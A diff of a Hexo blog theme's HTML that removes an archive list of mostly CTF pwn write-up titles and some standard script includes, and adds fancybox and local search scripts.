-        
-        
-        
-        
-        
-        
-    
-    
-    
-    
-    <div class="total-and-search">
-        <div class="total-archive">
-        Total : 64
-        </div>
-        <!-- search  -->
-        
-    </div>
-    
-    <div class="post-archive">
-    
-        
-            
-            
-            <div class="archive-year"> 2025 </div>
-            <ul class="year-list">
-            
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">04/29</span>
-            <a class="archive-post-title" href="/2025/04/29/hackergame2024%E5%A4%8D%E7%8E%B0/">hackergame2024复现</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">04/09</span>
-            <a class="archive-post-title" href="/2025/04/09/Squ1rrelCTF/">Squ1rrelCTF</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/27</span>
-            <a class="archive-post-title" href="/2025/01/27/KnightCTF/">KnightCTF</a>
-        </li>
-    
-        
-            
-            
-                
-                </ul>
-            
-            <div class="archive-year"> 2024 </div>
-            <ul class="year-list">
-            
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">10/23</span>
-            <a class="archive-post-title" href="/2024/10/23/geekgame2024/">geekgame2024</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">09/07</span>
-            <a class="archive-post-title" href="/2024/09/07/byuctf-iot/">byuctf_iot</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">09/02</span>
-            <a class="archive-post-title" href="/2024/09/02/gdbjail/">gdbjail</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">08/01</span>
-            <a class="archive-post-title" href="/2024/08/01/ImaginaryCTF/">ImaginaryCTF</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">07/22</span>
-            <a class="archive-post-title" href="/2024/07/22/dasctf2024-summer-challenge/">dasctf2024_summer_challenge</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">06/30</span>
-            <a class="archive-post-title" href="/2024/06/30/d3ctf-pwnshell%E5%A4%8D%E7%8E%B0/">d3ctf_pwnshell复现</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">06/04</span>
-            <a class="archive-post-title" href="/2024/06/04/litctf2024-pwn/">litctf2024_pwn</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">05/27</span>
-            <a class="archive-post-title" href="/2024/05/27/DragonKnightCTF-pwn/">DragonKnightCTF_pwn</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">05/22</span>
-            <a class="archive-post-title" href="/2024/05/22/ciscn-pwn/">ciscn_pwn</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">05/15</span>
-            <a class="archive-post-title" href="/2024/05/15/hnctf-pwn/">hnctf_pwn</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">05/14</span>
-            <a class="archive-post-title" href="/2024/05/14/miniL2024-pwn/">miniL2024_pwn</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">04/28</span>
-            <a class="archive-post-title" href="/2024/04/28/hznuctf/">hznuctf</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">04/24</span>
-            <a class="archive-post-title" href="/2024/04/24/geekcon/">geekcon</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">03/15</span>
-            <a class="archive-post-title" href="/2024/03/15/CyberApocalypse-2024-Hacker-Royale-wp/">CyberApocalypse_2024_Hacker_Royale_wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">02/27</span>
-            <a class="archive-post-title" href="/2024/02/27/hgame2024week3-wp/">hgame2024week3_wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">02/14</span>
-            <a class="archive-post-title" href="/2024/02/14/hgame2024week2-pwn-wp/">hgame2024week2_pwn_wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">02/11</span>
-            <a class="archive-post-title" href="/2024/02/11/0xl4ugh-pwn/">0xl4ugh_pwn</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">02/07</span>
-            <a class="archive-post-title" href="/2024/02/07/hgame2024week1-wp/">hgame2024week1_wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">02/06</span>
-            <a class="archive-post-title" href="/2024/02/06/beginctf2024-wp/">beginctf2024_wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/02</span>
-            <a class="archive-post-title" href="/2024/01/02/cbctf/">cbctf</a>
-        </li>
-    
-        
-            
-            
-                
-                </ul>
-            
-            <div class="archive-year"> 2023 </div>
-            <ul class="year-list">
-            
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">12/28</span>
-            <a class="archive-post-title" href="/2023/12/28/GeekChallenge2023/">GeekChallenge2023</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">12/28</span>
-            <a class="archive-post-title" href="/2023/12/28/hackergame2023/">Hackergame2023</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">11/29</span>
-            <a class="archive-post-title" href="/2023/11/29/isctf/">isctf</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">11/05</span>
-            <a class="archive-post-title" href="/2023/11/05/newstar-week2/">newstar_week2</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">10/21</span>
-            <a class="archive-post-title" href="/2023/10/21/0xgame/">0xgame</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">09/26</span>
-            <a class="archive-post-title" href="/2023/09/26/exp%E6%9C%AC%E5%9C%B0%E4%B8%8D%E9%80%9A%E8%BF%9C%E7%A8%8B%E9%80%9A%E7%9A%84%E9%97%AE%E9%A2%98/">exp本地不通远程通的问题</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">09/18</span>
-            <a class="archive-post-title" href="/2023/09/18/cdn%E7%BB%95%E8%BF%87%E5%A4%A7%E5%85%A8tips%E6%80%9D%E8%B7%AF/">cdn绕过大全tips思路</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">09/18</span>
-            <a class="archive-post-title" href="/2023/09/18/cnss2023/">cnss2023</a>
-        </li>
-    
-        
-            
-            
-                
-                </ul>
-            
-            <div class="archive-year"> Invalid date </div>
-            <ul class="year-list">
-            
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span>
-            <a class="archive-post-title" href="/2023/09/18/hello-world/">Hello World</a>
-        </li>
-    
-        
-            
-            
-                
-                </ul>
-            
-            <div class="archive-year"> 2025 </div>
-            <ul class="year-list">
-            
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">05/03</span>
-            <a class="archive-post-title" href="/2025/05/03/rust%E5%85%A5%E9%97%A8-%E6%95%B0%E6%8D%AE%E6%89%80%E6%9C%89%E6%9D%83%E4%B8%8E%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E7%AE%A1%E7%90%86/">rust入门_数据所有权与生命周期管理</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/27</span>
-            <a class="archive-post-title" href="/2025/01/27/x3ctf/">x3ctf</a>
-        </li>
-    
-        
-            
-            
-                
-                </ul>
-            
-            <div class="archive-year"> 2024 </div>
-            <ul class="year-list">
-            
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">09/04</span>
-            <a class="archive-post-title" href="/2024/09/04/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024pwn/">羊城杯2024pwn</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">08/31</span>
-            <a class="archive-post-title" href="/2024/08/31/nss3rd%E5%87%BA%E9%A2%98-Iterator-Trap%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/">nss3rd出题_Iterator_Trap解题思路</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">08/31</span>
-            <a class="archive-post-title" href="/2024/08/31/srctf-pwn%E5%87%BA%E9%A2%98/">srctf_pwn出题</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">08/31</span>
-            <a class="archive-post-title" href="/2024/08/31/xyctf/">xyctf</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">08/25</span>
-            <a class="archive-post-title" href="/2024/08/25/%E7%BE%8A%E5%9F%8E%E6%9D%AF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/">羊城杯2023部分题目复现</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">08/22</span>
-            <a class="archive-post-title" href="/2024/08/22/%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A81/">奇奇怪怪格式化字符串漏洞的利用1</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">08/08</span>
-            <a class="archive-post-title" href="/2024/08/08/tfcctf2024/">tfcctf2024</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">07/15</span>
-            <a class="archive-post-title" href="/2024/07/15/wkctf-pwn/">wkctf_pwn</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">06/25</span>
-            <a class="archive-post-title" href="/2024/06/25/xctf-ggbord%E5%A4%8D%E7%8E%B0/">xctf_ggbord复现</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">06/19</span>
-            <a class="archive-post-title" href="/2024/06/19/vsctf-pwn/">vsctf_pwn</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">05/30</span>
-            <a class="archive-post-title" href="/2024/05/30/xctf-BuggyAllocator%E5%A4%8D%E7%8E%B0/">xctf_BuggyAllocator复现</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">05/23</span>
-            <a class="archive-post-title" href="/2024/05/23/xv6-and-unix-utilities/">xv6_and_unix_utilities</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">04/28</span>
-            <a class="archive-post-title" href="/2024/04/28/%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bpwn%E6%96%B9%E5%90%91wp/">中国海洋大学信息安全竞赛pwn方向wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">03/31</span>
-            <a class="archive-post-title" href="/2024/03/31/%E5%B0%9D%E8%AF%95%E7%BC%96%E8%AF%91kernel%E5%92%8C%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/">尝试编译kernel和文件系统</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">03/27</span>
-            <a class="archive-post-title" href="/2024/03/27/nkctf-wp/">nkctf_wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">03/10</span>
-            <a class="archive-post-title" href="/2024/03/10/pearlctf-wp/">pearlctf_wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">03/04</span>
-            <a class="archive-post-title" href="/2024/03/04/osu-gaming-CTF-2024/">osu!gaming_CTF_2024</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">02/25</span>
-            <a class="archive-post-title" href="/2024/02/25/sictfr3-pwn-wp/">sictfr3_pwn_wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">02/14</span>
-            <a class="archive-post-title" href="/2024/02/14/nssr18-wp/">nssr18_wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/31</span>
-            <a class="archive-post-title" href="/2024/01/31/rw%E4%BD%93%E9%AA%8C%E8%B5%9Bwp/">rw体验赛wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/26</span>
-            <a class="archive-post-title" href="/2024/01/26/nssctfr16-wp/">nssctfr16_wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/24</span>
-            <a class="archive-post-title" href="/2024/01/24/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9Bwp/">春秋杯冬季赛wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/19</span>
-            <a class="archive-post-title" href="/2024/01/19/pwnable-tw/">pwnable.tw</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/18</span>
-            <a class="archive-post-title" href="/2024/01/18/uoftctf-pwn-wp/">uoftctf_pwn_wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/04</span>
-            <a class="archive-post-title" href="/2024/01/04/pwnable-kr/">pwnable.kr</a>
-        </li>
-    
-        
-            
-            
-                
-                </ul>
-            
-            <div class="archive-year"> 2023 </div>
-            <ul class="year-list">
-            
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">12/28</span>
-            <a class="archive-post-title" href="/2023/12/28/moectf-wp/">moectf_wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">12/28</span>
-            <a class="archive-post-title" href="/2023/12/28/newstar2023-week1/">newstar2023_week1</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">09/18</span>
-            <a class="archive-post-title" href="/2023/09/18/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/">php弱类型</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">09/18</span>
-            <a class="archive-post-title" href="/2023/09/18/python3-venv%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E4%BD%BF%E7%94%A8-%E8%A7%A3%E5%86%B3%E5%8C%85%E7%AE%A1%E7%90%86%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6%E6%B7%B7%E4%B9%B1%E7%9A%84%E9%97%AE%E9%A2%98/">python3-venv虚拟环境使用-解决包管理版本控制混乱的问题</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">09/18</span>
-            <a class="archive-post-title" href="/2023/09/18/sictf2023r2/">sictf2023</a>
-        </li>
-    
-    </div>
-</div>
-
-        <div class="sidebar-panel-tags">
-    <div class="sidebar-tags-name">
-        
-            <span class="sidebar-tag-name" data-tags="ctf writeup">
-                <span class="iconfont-archer">&#xe606;</span>
-                ctf writeup
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="misc">
-                <span class="iconfont-archer">&#xe606;</span>
-                misc
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="os">
-                <span class="iconfont-archer">&#xe606;</span>
-                os
-            </span>
-        
-    </div>
-    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
-    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
-        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
-    </div> 
-    <div class="sidebar-tags-list"></div>
-</div>
-
-        <div class="sidebar-panel-categories">
-    <div class="sidebar-categories-name">
-    
-    </div>
-    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
-    <div class="sidebar-categories-list"></div>
-</div>
-
-    </div>
-</div>
-
-        <!-- site-meta -->
-        <script>
-    var siteMetaRoot = "/"
-    if (siteMetaRoot === "undefined") {
-        siteMetaRoot = '/'
-    }
-    var siteMeta = {
-        url: "https://nyyyddddn.github.io",
-        root: siteMetaRoot,
-        author: "nyyyddddn"
-    }
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
 </script>
 
-        <!-- import experimental options here -->
-        <!-- Custom Font -->
 
 
-        <!-- main func -->
-        <script src="/scripts/main.js?v=20211217"></script>
-        <!-- dark mode -->
-        <script src="/scripts/dark.js?v=20211217"></script>
-        <!-- fancybox -->
-        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" defer></script>
-        <!-- algolia -->
-        
-        <!-- busuanzi -->
-        
-            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
-        
-        <!-- CNZZ -->
-        
-        <!-- async load share.js -->
-        
-            <script src="/scripts/share.js?v=20211217" async></script>
-        
-        <!-- mermaid -->
-        
-    </body>
-</html>
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
